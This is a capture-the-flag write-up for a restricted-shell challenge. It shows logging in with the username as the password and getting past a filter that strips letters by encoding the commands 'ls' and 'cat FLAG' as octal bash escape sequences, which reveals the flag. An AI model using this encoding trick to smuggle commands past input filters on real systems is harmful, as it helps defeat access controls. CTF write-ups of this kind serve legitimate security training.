
# Challenge #04: Gunslinger Joe's private Terminal

## Description

Author: cutz
Category: Misc

Gunslinger Joe has a pretty bad memory and always forgets the password for
his private terminals! That's why he always uses his username as password but
also makes sure that absolutely no one else who knows his name can interact
with his secure terminal. Wouldn't it be super embarrassing for him to prove
him wrong?

SSH: gunslinger_joe@wildwildweb.fluxfingers.net
PORT: 1403

## Solution

Author: Sam Thomas / xorpse

After logging in and attempting to enter a few commands into the shell, we see
that characters in `[A-Za-z]` are being stripped from the input before being
interpreted:

```{.bash}
$ ls
$ echo "hello"
: : command not found
$ echo "12345"
: 12345: command not found
$ $?
: 0: command not found
```

Since digits (`[0-9]`) are not being stripped, we could try to encode the command
using escape sequences -- it turns out octal as a number system is perfectly suited
for this. The command `ls` can be encoded as: `$'\154'$'\163'` and gives:

```{.bash}
$ $'\154'$'\163'
FLAG  terminal
```

Now, it's simply a matter of performing `cat FLAG`; which can be encoded as:
`$'\143'$'\141'$'\164'  $'\106'$'\114'$'\101'$'\107'`

...and gives us:

```{.bash}
$ $'\143'$'\141'$'\164'  $'\106'$'\114'$'\101'$'\107'
flag{joe_thought_youd_suck_at_bash}
```
